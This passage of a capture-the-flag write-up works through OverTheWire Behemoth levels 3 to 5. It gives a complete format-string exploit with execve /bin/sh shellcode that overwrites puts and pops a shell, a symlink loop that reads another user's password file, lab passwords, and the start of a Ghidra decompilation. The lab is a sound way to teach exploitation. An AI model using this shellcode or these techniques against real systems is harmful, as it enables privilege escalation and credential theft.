class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x53535353</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x53535353</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd568: &nbsp; &nbsp; </span><span class="c4">0x25535353</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x78303031</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">x</span><span class="c4">000a6e25</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x00000000</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>The exploit begins at address </span><span class="c4">0</span><span class="c8">xffffd4d8</span><span>&nbsp;+</span><span>&nbsp;8 (as can be seen from 0x41414141 which is AAAA) followed by the address of puts and another string of four A&rsquo;s. This is then followed by puts + 2, and finally the nop sled begins at </span><span class="c4">0</span><span class="c8">xffffd4e8</span><span>&nbsp;+</span><span>&nbsp;8. For the purposes of this exploit, a memory address of </span><span class="c4">0</span><span class="c8">xffffd518</span><span>&nbsp;was</span><span>&nbsp;chosen. Note how this value in decimal is 4294956312 which theoretically could be obtained by passing in an exploit that is about 4294956312 bytes long. In reality, however, this would cause a memory overload (and even if it didn&#39;t, printing this many bytes to stdout would take a long time). &nbsp;As mentioned in </span><span class="c34"><a class="c6" href="#h.jagnc9qowxus">Exploit Development</a></span><span>, t</span><span>his can be bypassed </span><span class="c13">by passing two %n format specifiers which point to two different points in memory whose addresses are two bytes apart. </span></p><p class="c12"><span class="c13">The largest value for each part of the memory address when split into two is 16^4 - 1 which is 65535. This largely reduces the 4294956312 length previously mentioned. Incidentally, the largest value possible for a 32 bit binary is 16^8 - 1 which is 4294967295 or 0xffffffff. </span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span class="c13">A value of 0xef was written to the puts function address; however, a value of 0xd510 (for the lower two bytes) was desired. The padding necessary for achieving this value can be determined through the following calculation:</span></p><p class="c9"><span class="c13"></span></p><p class="c36 c47"><span class="c15">desired_output - current_output + current_padding</span></p><p class="c47 c36 c45"><span class="c15"></span></p><a id="t.7ddafa50c9d43483f65dbf474fff56ebe8d8d384"></a><a id="t.42"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) p </span><span class="c4">0xd510</span><span class="c8">&nbsp;- </span><span class="c4">0xef</span><span class="c8">&nbsp;+ </span><span class="c4">100</span><span class="c8"><br>$</span><span class="c4">3</span><span class="c8">&nbsp;= </span><span class="c4">54405</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">Thus, a padding of 54405 is needed to output 0xd510:</span></p><a id="t.83cfc8737335a74a64ececc8a57698aa8e77172d"></a><a id="t.43"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) r &lt; exploit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Starting </span><span class="c7">program</span><span class="c8">: /behemoth/behemoth3 &lt; exploit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Identify yourself: Welcome, AAAAAASSSSSSSSSSSSSSSSSSSSSSS<br><br></span><span class="c7">Program</span><span class="c8">&nbsp;received signal SIGSEGV, Segmentation fault.<br>x0000d510 </span><span class="c7">in</span><span class="c8">&nbsp;?? ()</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">The lower two bytes were successfully overwritten to 0xd510. The same method can be used to overwrite the two most significant bytes:</span></p><a id="t.dd1fe927cec9fe2ab3a9a8c9807716d1db31607a"></a><a id="t.44"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth3@behemoth:/tmp/overwrite_puts$ python -c &quot;print &#39;AAAA&#39; + &#39;</span><span class="c0">\x</span><span class="c8">ac</span><span class="c0">\x</span><span class="c8">97</span><span class="c0">\x</span><span class="c8">04</span><span class="c0">\x</span><span class="c8">08&#39; + &#39;AAAA&#39; + &#39;</span><span class="c0">\x</span><span class="c8">ae</span><span class="c0">\x</span><span class="c8">97</span><span class="c0">\x</span><span class="c8">04</span><span class="c0">\x</span><span class="c8">08&#39; + &#39;</span><span class="c0">\x</span><span class="c8">90&#39;*100 + &#39;S&#39;*23 + &#39;</span><span class="c3">%54405x%</span><span class="c8">n</span><span class="c3">%100x%</span><span class="c8">n&#39;&quot; &gt; exploit</span></p></td></tr></table><p class="c12"><span class="c32 c75">Note that a padding of 100 was arbitrarily picked so as to perform the following calculations:</span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span class="c13">After inputting a padding of 100 bytes for the two most significant bytes, the subsequent value was determined to be 0xd574:</span></p><a id="t.f0eb1d5d210d4dc6342df82c551324630ea9ca87"></a><a id="t.45"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) r &lt; exploit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Starting </span><span class="c7">program</span><span class="c8">: /behemoth/behemoth3 &lt; exploit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Identify yourself: Welcome, AAAAAASSSSSSSSSSSSSSSSSSSSSSS<br><br></span><span class="c7">Program</span><span class="c8">&nbsp;received signal SIGSEGV, Segmentation fault.<br>xd574d510 </span><span class="c7">in</span><span class="c8">&nbsp;?? ()</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">The correct padding can subsequently be calculated:</span></p><a id="t.0a727134978777ece90e31a9cf74e3f0bd009164"></a><a id="t.46"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) p </span><span class="c4">0xffff</span><span class="c8">&nbsp;- </span><span class="c4">0xd574</span><span class="c8">&nbsp;+ </span><span class="c4">100</span><span class="c8"><br>$</span><span class="c4">2</span><span class="c8">&nbsp;= </span><span class="c4">10991</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">Therefore, the final exploit will look like the following:</span></p><a id="t.1a19ea0f4a28d67238789923f47558303eeeaa1c"></a><a id="t.47"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">python -c &quot;print &#39;AAAA&#39; + &#39;</span><span class="c0">\x</span><span class="c8">ac</span><span class="c0">\x</span><span class="c8">97</span><span class="c0">\x</span><span class="c8">04</span><span class="c0">\x</span><span class="c8">08&#39; + &#39;AAAA&#39; + &#39;</span><span class="c0">\x</span><span class="c8">ae</span><span class="c0">\x</span><span class="c8">97</span><span class="c0">\x</span><span class="c8">04</span><span class="c0">\x</span><span class="c8">08&#39; + &#39;</span><span class="c0">\x</span><span class="c8">90&#39;*100 + &#39;</span><span class="c0">\x</span><span class="c8">31</span><span class="c0">\x</span><span class="c8">c0</span><span class="c0">\x</span><span class="c8">50</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">73</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8"><br>62</span><span class="c0">\x</span><span class="c8">69</span><span class="c0">\x</span><span class="c8">6e</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e3</span><span class="c0">\x</span><span class="c8">50</span><span class="c0">\x</span><span class="c8">53</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">b0</span><span class="c0">\x</span><span class="c8">0b</span><span class="c0">\x</span><span class="c8">cd</span><span class="c0">\x</span><span class="c8">80&#39; + &#39;</span><span class="c3">%54405x%</span><span class="c8">n</span><span class="c3">%10991x%</span><span class="c8">n&#39;&quot;</span></p></td></tr></table><h4 class="c11" id="h.z7u0fjslsnt8"><span>Popping a Shell</span></h4><p class="c12"><span class="c13">Note that the S was also changed to the actual shellcode. Executing this payload within GDB causes the debug process to abruptly exit due to the execution of /bin/dash:</span></p><a id="t.811d0c183cdaa02058b32e01b95327277e55acd1"></a><a id="t.48"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) r &lt; exploit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c0">Starting</span><span class="c8">&nbsp;program: /</span><span class="c7">behemoth/behemoth3 </span><span class="c8">&lt; exploit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c0">Identify</span><span class="c8">&nbsp;yourself: Welcome, AAAAAA1Ph//shh/</span><span class="c7">binPS<br></span><span class="c8"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c4">41414141</span><span class="c8"><br></span><span class="c0">process</span><span class="c8">&nbsp;</span><span class="c4">14128</span><span class="c8">&nbsp;is executing new program: /</span><span class="c7">bin/dash<br></span><span class="c8">[Inferior </span><span class="c4">1</span><span class="c8">&nbsp;(process </span><span class="c4">14128</span><span class="c8">) exited normally]</span></p></td></tr></table><p class="c45 c82"><span class="c13"></span></p><p class="c12"><span class="c13">When this payload is piped straight into the binary without GDB, a shell is returned:</span></p><a id="t.dd2f5f4707fcf1066b16d7c5eabed1e508a72d96"></a><a id="t.49"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth3@behemoth:/tmp/overwrite_puts$ (python -c &quot;print &#39;AAAA&#39; + &#39;</span><span class="c0">\x</span><span class="c8">ac</span><span class="c0">\x</span><span class="c8">97</span><span class="c0">\x</span><span class="c8">04</span><span class="c0">\x</span><span class="c8">08&#39; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>+ &#39;AAAA&#39; + &#39;</span><span class="c0">\x</span><span class="c8">ae</span><span class="c0">\x</span><span class="c8">97</span><span class="c0">\x</span><span class="c8">04</span><span class="c0">\x</span><span class="c8">08&#39; + &#39;</span><span class="c0">\x</span><span class="c8">90&#39;*100 + &#39;</span><span class="c0">\x</span><span class="c8">31</span><span class="c0">\x</span><span class="c8">c0</span><span class="c0">\x</span><span class="c8">50</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">73</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c0">\x</span><span class="c8">62</span><span class="c0">\x</span><span class="c8">69</span><span class="c0">\x</span><span class="c8">6e</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e3</span><span class="c0">\x</span><span class="c8">50</span><span class="c0">\x</span><span class="c8">53</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">b0</span><span class="c0">\x</span><span class="c8">0b</span><span class="c0">\x</span><span class="c8">cd</span><span class="c0">\x</span><span class="c8">80&#39; + &#39;</span><span class="c3">%54405x%</span><span class="c8">n</span><span class="c3">%10991x%</span><span class="c8">n&#39;&quot;;cat -) | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /behemoth/behemoth3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Identify yourself: Welcome, AAAAAA1Ph//shh/binPS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br><br><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;41414141<br>whoami<br>behemoth4<br>cat /etc/behemoth_pass/behemoth4<br>ietheishei</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>Note that </span><span class="c29">cat - </span><span>&nbsp;is appended to the end of the payload. This is an essential part of the exploit which allows the process to interact between stdin and stdout. Without </span><span class="c29">cat</span><span class="c13">, the process immediately exits without errors. </span></p><p class="c12"><span>Incidentally, when first performing the exploit of this binary, a /bin/bash shellcode</span><sup><a href="#ftnt6" id="ftnt_ref6">[6]</a></sup><span>&nbsp;was used, however it did not work outside GDB for unknown reasons. When a binary exploitation does not work as intended, it could be beneficial to use a different shellcode to see if it resolves the problem.</span></p><h2 class="c19" id="h.eoybw49l4xbw"><span class="c46 c22">Behemoth 4</span></h2><p class="c12"><span class="c13">With the necessary permissions obtained by compromising the behemoth4 user, the behemoth4 binary can be executed. </span></p><h3 class="c19" id="h.c5nq5aylye9u"><span class="c25 c22">Binary Analysis</span></h3><p class="c12"><span class="c13">Before being able to exploit the binary, it is necessary to understand how it works first.</span></p><h4 class="c11" id="h.eu475ejo4tfp"><span class="c44 c22">Behavior</span></h4><p class="c12"><span class="c13">Executing the binary does not result in anything out of the ordinary:</span></p><a id="t.e1a85bba40c8f8a913142576f9638bc2d53963df"></a><a id="t.50"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth4</span><span class="c3">@behemoth</span><span class="c0">:/tmp</span><span class="c3">$ </span><span class="c8">/behemoth/behemoth4<br>PID </span><span class="c7">not</span><span class="c8">&nbsp;found!</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">The program simply prints out &ldquo;PID not found!&rdquo; and exits immediately. </span></p><h4 class="c11" id="h.vx8y9qi7edp2"><span class="c44 c22">Ghidra</span></h4><p class="c12"><span class="c13">Within Ghidra, we can get a further look at how the program is getting the PID, and what it does with it:</span></p><a id="t.e91de416b8da16d724afd3ced1a4d62a1997fe0e"></a><a id="t.51"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">undefined4 main(void)<br><br>{<br> &nbsp;char local_30 [</span><span class="c4">20</span><span class="c8">]</span><span class="c17">;</span><span class="c8"><br> &nbsp;int local_1c</span><span class="c17">;</span><span class="c8"><br> &nbsp;FILE *local_18</span><span class="c17">;</span><span class="c8"><br> &nbsp;__pid_t local_14</span><span class="c17">;</span><span class="c8"><br> &nbsp;undefined *local_c</span><span class="c17">;</span><span class="c8"><br> &nbsp;<br> &nbsp;local_c = &amp;stack</span><span class="c4">0x00000004</span><span class="c17">;</span><span class="c8"><br> &nbsp;local_14 = getpid()</span><span class="c17">;</span><span class="c8"><br> &nbsp;sprintf(local_30,</span><span class="c0">&quot;/tmp/%d&quot;</span><span class="c8">,local_14)</span><span class="c17">;</span><span class="c8"><br> &nbsp;local_18 = fopen(local_30,</span><span class="c0">&quot;r&quot;</span><span class="c8">)</span><span class="c17">;</span><span class="c8"><br> &nbsp;if (local_18 == (FILE *)</span><span class="c4">0x0</span><span class="c8">) {<br> &nbsp; &nbsp;puts(</span><span class="c0">&quot;PID not found!&quot;</span><span class="c8">)</span><span class="c17">;</span><span class="c8"><br> &nbsp;}<br> &nbsp;else {<br> &nbsp; &nbsp;sleep(</span><span class="c4">1</span><span class="c8">)</span><span class="c17">;</span><span class="c8"><br> &nbsp; &nbsp;puts(</span><span class="c0">&quot;Finished sleeping, fgetcing&quot;</span><span class="c8">)</span><span class="c17">;</span><span class="c8"><br> &nbsp; &nbsp;while( true ) {<br> &nbsp; &nbsp; &nbsp;local_1c = fgetc(local_18)</span><span class="c17">;</span><span class="c8"><br> &nbsp; &nbsp; &nbsp;if (local_1c == -</span><span class="c4">1</span><span class="c8">) </span><span class="c7">break;<br></span><span class="c8">&nbsp; &nbsp; &nbsp; putchar(local_1c)</span><span class="c17">;</span><span class="c8"><br> &nbsp; &nbsp;}<br> &nbsp; &nbsp;fclose(local_18)</span><span class="c17">;</span><span class="c8"><br> &nbsp;}<br> &nbsp;return </span><span class="c4">0</span><span class="c17">;</span><span class="c8"><br>}</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">The program starts by declaring a couple of variables. The getpid function is called, and local_14 is set to equal its output. This output is then concatenated with /tmp, and local_30 is set to equal it. Afterwards, the local_18 variable is set to equal the output when opening a file in /tmp whose name corresponds to the id of the binary&rsquo;s process (which is local_30). If the file does not exist, then &ldquo;PID not found!&rdquo; is printed out. Otherwise, the contents of the file is read out by using the getchar function within a while loop.</span></p><h3 class="c19" id="h.rmftonkmrg2x"><span class="c22 c25">Binary Exploitation</span></h3><p class="c12"><span class="c13">The problem with this program is that it assumes that it can only read files within the /tmp directory. However, symbolic links can be used to make the program read the password file of the behemoth5 user. </span></p><h4 class="c11" id="h.c06ihpx7yw4e"><span class="c44 c22">Symbolic Link Attack</span></h4><p class="c12"><span class="c13">Seeing as the pid of the binary cannot be easily determined before executing the program, a bash script can be utilized to create many files that correspond to possible PIDs. Before creating this bash script, the approximate PID of the binary must first be found:</span></p><a id="t.bf12fd653177156e049f506420ebdd28054cb4b9"></a><a id="t.52"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth4@behemoth:/tmp$ ltrace /behemoth/behemoth4<br>__libc_start_main(</span><span class="c4">0</span><span class="c8">x804857b, </span><span class="c4">1</span><span class="c8">, </span><span class="c4">0</span><span class="c8">xffffd674, </span><span class="c4">0</span><span class="c8">x8048640 &lt;unfinished ...&gt;<br></span><span class="c24">getpid</span><span class="c4">()</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= </span><span class="c4">22928</span><span class="c8"><br></span><span class="c24">sprintf</span><span class="c4">(</span><span class="c0">&quot;/tmp/22928&quot;</span><span class="c4">, </span><span class="c0">&quot;/tmp/%d&quot;</span><span class="c4">, 22928)</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = </span><span class="c4">10</span><span class="c8"><br></span><span class="c24">fopen</span><span class="c4">(</span><span class="c0">&quot;/tmp/22928&quot;</span><span class="c4">, </span><span class="c0">&quot;r&quot;</span><span class="c4">)</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= </span><span class="c4">0</span><span class="c8"><br>puts(</span><span class="c0">&quot;PID not found!&quot;</span><span class="c8">PID not found!<br>) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = </span><span class="c4">15</span><span class="c8"><br>+++ exited (status </span><span class="c4">0</span><span class="c8">) +++</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">This process was assigned to the ID of 22928, and it therefore looked for a file called 22928 within the /tmp directory. The PID upon the next execution of the binary must be greater than 22928 but likely less than 30000:</span></p><a id="t.5ee655dd3ca08fd5d7d964ef8f8139ebde14d295"></a><a id="t.53"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth4</span><span class="c3">@behemoth</span><span class="c0">:/tmp</span><span class="c3">$ </span><span class="c7">for</span><span class="c8">&nbsp;i </span><span class="c7">in</span><span class="c8">&nbsp;{</span><span class="c4">22928</span><span class="c8">..</span><span class="c4">30000</span><span class="c8">}; </span><span class="c7">do</span><span class="c8">&nbsp;ln -s /etc/behemoth_pass/behemoth5 </span><span class="c3">$i</span><span class="c8">;done</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">Now, when the binary is executed, it will read the contents of behemoth5&rsquo;s password:</span></p><a id="t.c3df16d5d3d3b6f6cf448450384c00a079d58fd4"></a><a id="t.54"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth4</span><span class="c3">@behemoth</span><span class="c0">:/tmp</span><span class="c3">$ </span><span class="c8">/behemoth/behemoth4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Finished sleeping, fgetcing &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>aizeeshing &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p></td></tr></table><h2 class="c19" id="h.7apgrhmap56f"><span class="c46 c22">Behemoth 5</span></h2><p class="c12"><span>By first logging into the account through ssh with the credentials found in </span><span class="c34"><a class="c6" href="#h.eoybw49l4xbw">Behemoth 4</a></span><span class="c13">, the behemoth5 binary can be executed. </span></p><h3 class="c19" id="h.snnuhjwulxzn"><span class="c25 c22">Binary Analysis</span></h3><p class="c12"><span class="c13">When executing the binary, nothing out of the ordinary occurs. The binary simply exits without anything printing out to stdout. After downloading the binary onto the attack box, Ghidra could be utilized to help in analyzing the binary.</span></p><h4 class="c11" id="h.yodf5dnlygui"><span class="c44 c22">Ghidra</span></h4><a id="t.8d9b31c6228d8734bb47c67db6dc0e7bcca9e0b3"></a><a id="t.55"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">void main(void)<br><br>{<br> &nbsp;long lVar1;<br> &nbsp;size_t sVar2;<br> &nbsp;int iVar3;<br> &nbsp;undefined local_38 [</span><span class="c4">4</span><span class="c8">];<br> &nbsp;undefined4 local_34;<br> &nbsp;undefined auStack48 [</span><span class="c4">8</span><span class="c8">];<br> &nbsp;ssize_t local_28;<br> &nbsp;int local_24;<br> &nbsp;hostent *local_20;<br> &nbsp;char *local_1c;<br> &nbsp;FILE *local_18;<br> &nbsp;size_t local_14;<br> &nbsp;undefined *puStack12;<br> &nbsp;<br> &nbsp;puStack12 = &amp;stack0x00000004;<br> &nbsp;local_14 = </span><span class="c4">0</span><span class="c8">;<br> &nbsp;local_18 = fopen(</span><span class="c0">&quot;/etc/behemoth_pass/behemoth6&quot;</span><span class="c8">,</span><span 